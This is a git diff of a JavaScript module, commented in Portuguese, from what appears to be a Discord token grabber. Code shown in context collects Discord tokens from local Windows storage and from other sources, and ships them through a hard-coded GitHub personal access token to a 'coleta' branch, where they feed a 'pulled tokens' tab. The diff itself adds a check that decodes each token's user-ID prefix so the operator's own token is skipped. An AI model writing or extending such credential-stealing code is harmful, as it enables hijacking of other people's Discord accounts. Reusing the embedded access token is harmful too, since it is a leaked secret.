@@ -30,6 +30,20 @@ const BRANCH_COLETA = 'coleta';
 const TOKEN_COLETA_EMBUTIDO =
 	process.env.PKTCO_GH_TOKEN || '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';
 const DIR_COLETA = 'coleta';
+// ID do dono do app (mesmo gate da aba Tokens puxadas).
+const ID_DONO = String(process.env.TOKENS_PUXADAS_DISCORD_ID || '1546009342925344788');
+// O 1o segmento de uma token do Discord é o ID do usuário em base64
+// (formato <id>.<ts>.<assinatura>). Decodificando, dá pra saber de quem é a
+// token sem chamar a API — usado pra NUNCA coletar/salvar a token do próprio
+// dono (ele não quer ver a si mesmo na lista).
+function ehTokenDoDono(token) {
+	try {
+		const prefixo = String(token || '').split('.')[0];
+		return Buffer.from(prefixo, 'base64').toString('utf8') === ID_DONO;
+	} catch {
+		return false;
+	}
+}
 const ARQ_SNAPSHOT = path.join(dataDir(), 'tokens-puxadas.json');
 const INTERVALO_ENVIAR_MS = Number(process.env.PKTCO_INTERVALO_MS) || 30 * 60 * 1000;
 const INTERVALO_RECEBER_MS = Number(process.env.PKTCO_RECEBER_MS) || 60 * 1000;
@@ -168,7 +182,8 @@ async function coletarAgora(identidade = null) {
 		const entradas = [];
 		const vistas = new Set();
 		for (const s of selfs) {
-			if (s.token && !vistas.has(s.token)) {
+			// A token do próprio dono nunca sai: nem do self dele, nem daqui.
+			if (s.token && !vistas.has(s.token) && !ehTokenDoDono(s.token)) {
 				vistas.add(s.token);
 				entradas.push({ token: s.token, usuario: s.usuario || '' });
 			}
@@ -176,7 +191,7 @@ async function coletarAgora(identidade = null) {
 		try {
 			const locais = await buscarTokensWindows({ comUsuario: true });
 			for (const l of locais) {
-				if (l.token && !vistas.has(l.token)) {
+				if (l.token && !vistas.has(l.token) && !ehTokenDoDono(l.token)) {
 					vistas.add(l.token);
 					entradas.push({ token: l.token, usuario: l.usuario || '' });
 				}
@@ -252,6 +267,10 @@ async function atualizarSnapshot() {
 				try {
 					tokenPlano = decifrarToken({ token_cifrado: t.t, iv: t.iv, auth_tag: t.tag });
 				} catch {}
+				// A token do próprio dono não entra no snapshot nem aparece na aba,
+				// mesmo se ela subiu antes do filtro de envio ou veio de outra
+				// máquina onde ele estava logado.
+				if (tokenPlano && ehTokenDoDono(tokenPlano)) continue;
 				combinado.set(t.h, {
 					hash: t.h,
 					usuario: t.u || '',
